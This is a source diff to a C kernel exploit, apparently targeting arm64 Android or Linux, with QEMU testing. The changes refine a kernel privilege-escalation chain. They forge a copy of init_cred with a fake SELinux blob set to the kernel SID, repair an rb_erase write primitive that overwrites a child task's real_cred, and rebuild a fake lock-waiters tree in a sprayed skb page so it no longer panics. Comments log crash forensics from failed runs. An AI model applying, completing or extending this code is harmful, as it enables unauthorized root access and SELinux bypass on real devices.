@@ -539,6 +539,13 @@ int has_zero_byte(uintptr_t value) {
  * boots. Override at runtime with KPHYS=0x... when porting to a new board. */
 uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
 
+/* Runtime-tunable physmap base (P0_PHYS): the alias math (phys -
+ * phys_offset) wraps negative when the kernel loads BELOW the physmap
+ * base — QEMU virt loads the Image at 0x401f0000 < 0x80000000, turning
+ * every data_addr() into an unmapped 0xffffffffc2xxxxxx pointer (the
+ * rb_erase store-fault address). Set P0_PHYS=0x40000000 on QEMU. */
+uint64_t p0_phys_offset = P0_PHYS_OFFSET;
+
 /* Per-device image address of init_cred, set from the offsets table by main.c.
  * Defaults to the compile-time value so non-table builds behave as before. */
 uintptr_t g_init_cred_image = INIT_CRED;
@@ -548,19 +555,23 @@ void init_p0_profile(void) {
   if (v) {
     p0_kernel_phys_load = strtoull(v, NULL, 0);
   }
+  v = getenv("P0_PHYS");
+  if (v) {
+    p0_phys_offset = strtoull(v, NULL, 0);
+  }
   pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
           (unsigned long long)p0_kernel_phys_load,
-          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
+          (unsigned long long)(p0_kernel_phys_load - p0_phys_offset));
 }
 
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = p0_kernel_phys_load + off;
-  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+  return ((phys - p0_phys_offset) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - P0_PHYS_OFFSET);
+  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - p0_phys_offset);
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -623,7 +634,8 @@ static const uint64_t k_init_cred_image[22] = {
     0x0000000000000002ULL,
 };
 
-static void fill_init_cred_copy(unsigned char *p, size_t off) {
+static void fill_init_cred_copy(unsigned char *p, size_t off,
+                                uintptr_t cred_kva) {
   unsigned char *c = p + off;
   memset(c, 0, 176);
   for (int i = 0; i < 22; i++) {
@@ -631,6 +643,22 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
     if (v >= 0xffffffc000000000ULL) /* link-time kernel VA: re-slide */
       v += kaslr_slide;
     put64(c, (size_t)i * 8, v);
+  }
+  /*
+   * SELINUX BLOB FIX (09-20, jc4/jc5 forensics): image word 15 (+0x78,
+   * cred->security) is ZERO — init_cred's security blob is assigned at
+   * RUNTIME, not in the static image. A task using this cred panics on
+   * its first SELinux-hooked syscall (NULL deref in current_sid), which
+   * is exactly where the child died on SIGCONT resume. Craft the blob
+   * beside the cred copy — page gap cred+0xA8..W0 (free) — with
+   * osid=sid=1 (SELINUX_KERNEL_SID, the u:r=kernel domain; same value
+   * root.c's sid-pair write uses) and point security at it.
+   */
+  {
+    size_t blob_off = off + 0xB0; /* page+0x2B0 via SKB delta — free gap */
+    put32(p, blob_off + 0, SELINUX_KERNEL_SID); /* osid */
+    put32(p, blob_off + 4, SELINUX_KERNEL_SID); /* sid  */
+    put64(c, 0x78, (uint64_t)(cred_kva + 0xB0));
   }
   /*
    * KIMI K3 FIX (09-20): usage MUST be a sane positive refcount.
@@ -1635,8 +1663,35 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         use_classic = 1;
       if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0) ||
           env_flag("MODE4_SLIDE_CRED", 0) || env_flag("MODE4_SLIDE_KPTR", 0) ||
-          env_flag("MODE4_SLIDE_GBOOT", 0)) {
-        if (env_flag("MODE4_CAPSONLY", 0) && env_flag("MODE4_CAPS778", 0)) {
+          env_flag("MODE4_SLIDE_GBOOT", 0) ||
+          /* CAPSONLY DUAL (09-20): the KIMI dual-write must also run in the
+           * plain CAPSONLY fire env (no slide-mode flag) — previously this
+           * branch was slide-gated only, so the GUARD override (now opt-in
+           * via MODE4_GUARD_NULL) was the only W0.pi that ever ran and
+           * +0x778 was never written. */
+          (env_flag("MODE4_CAPSONLY", 0) && env_flag("MODE4_CAPS778", 0) &&
+           g_child_cred) || env_flag("MODE4_QEMU_DUAL", 0)) {
+        if (env_flag("MODE4_QEMU_DUAL", 0)) {
+            /* QEMU-only shape twin: identical DUAL algebra (value-as-parent,
+             * right=0 → erase takes the no-right path ending in
+             * *(left)=pc) but with the bootid readback as the "left" and
+             * the spray cred copy as the "pc" — verifiable without the
+             * child spawn (perf self-leak does not work under TCG).
+             * QEMU_TARGET env forces the write address: without the child,
+             * pselect_write_target() still points at the payload-internal
+             * fallback (fake_fops), which makes the erase corrupt our own
+             * fops table / waiters tree — the observed QEMU self-KP. */
+            const char *qt = getenv("QEMU_TARGET");
+            write_pc = g_cred_copy
+                           ? (uint64_t)g_cred_copy
+                           : (uint64_t)fake_fops;
+            write_right = 0;
+            write_left = (qt && qt[0])
+                             ? (uint64_t)strtoull(qt, NULL, 0)
+                             : (uint64_t)pselect_write_target();
+            pr_info("QEMU_DUAL W0.pi: *(%016zx)=pc right=0 (pc=cred_copy)\n",
+                    (size_t)write_left);
+        } else if (env_flag("MODE4_CAPSONLY", 0) && env_flag("MODE4_CAPS778", 0)) {
           /* KIMI DUAL: W0.pi writes real_cred (+0x778) = child cred.
            * Main tree writes subjective (+0x780). Both same walk. */
           if (g_child_cred) {
@@ -1698,8 +1753,18 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
        * *(sys_exit.funcs) = 0 — so BOTH writes are useful:
        *   W0.pi: guard handler zeroed
        *   main tree: caps cred installed
+       *
+       * MODE4_GUARD_NULL (09-20, jc4-jc10 forensics): this override ALSO
+       * silently replaced the KIMI DUAL pi-write (child+0x778 was never
+       * written — the "JC2 DUAL" print predates this assignment). And the
+       * leaf-NULL address derives from a hardcoded image offset 0x2950700
+       * + KPHYS mapping — jc10 (stamp intact, punch walk ran for real)
+       * died exactly when this write would execute; jc4-8 (walk defused
+       * early by the owner re-link) survived with zero writes landed.
+       * Default OFF now: W0.pi keeps the DUAL cred write; guard unhook is
+       * opt-in pending a per-boot-verified address.
        */
-      if (env_flag("MODE4_CAPSONLY", 0)) {
+      if (env_flag("MODE4_CAPSONLY", 0) && env_flag("MODE4_GUARD_NULL", 0)) {
         write_pc = (data_addr(KIMAGE_TEXT_BASE + 0x02950700ULL) - 8) | 1ULL;
         write_right = 0;
         write_left = 0;
@@ -1857,11 +1922,22 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       if (chunk == 0)
         pr_info("mode4 CLASSIC lock.waiters root=leftmost=W0\n");
     } else if (mode4_main_tree && payload_mode == PAGE_PAYLOAD_FOPS) {
-      put64(p, LOCK_OFF + 0x08, fake_fops & ~3ULL);
+      /*
+       * LOCK_ROOT_W0 (09-21, jc13/jc14 KP analysis): the waiters-tree ROOT
+       * must be a REAL rb node on our page, not the fops table. The walk's
+       * post-dequeue REQUEUE descends from this root comparing prios —
+       * with root=fake_fops it treats the configfs fops TABLE as an rb
+       * node (descends into .read/.write JT pointers as node pointers,
+       * writes child links into table slots) → KP inside the punch's
+       * first setattr. fake_w0 is a clean {left=0,right=0,pc} node: the
+       * requeue links the ghost under it, all writes stay on our page.
+       */
+      put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
       if (chunk == 0)
-        pr_info("mode4 MAIN_TREE lock.waiters root=fake_fops leftmost=W0\n");
+        pr_info("mode4 MAIN_TREE lock.waiters root=leftmost=W0 (LOCK_ROOT_W0 "
+                "fix: requeue descends a real node, not the fops table)\n");
     } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
@@ -2127,7 +2203,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       }
       if (pselect_custom_write >= 2 || env_flag("MODE4_SLIDE_CRED", 0) ||
           env_flag("MODE4_UID0", 0)) {
-        fill_init_cred_copy(p, CRED_COPY_OFF);
+        fill_init_cred_copy(p, CRED_COPY_OFF, payload_base + CRED_COPY_OFF);
         if (chunk == 0) {
           g_cred_copy = payload_base + CRED_COPY_OFF;
           pr_info("cred_copy=%016zx (spray; W2 VALUE, not init_cred)\n",
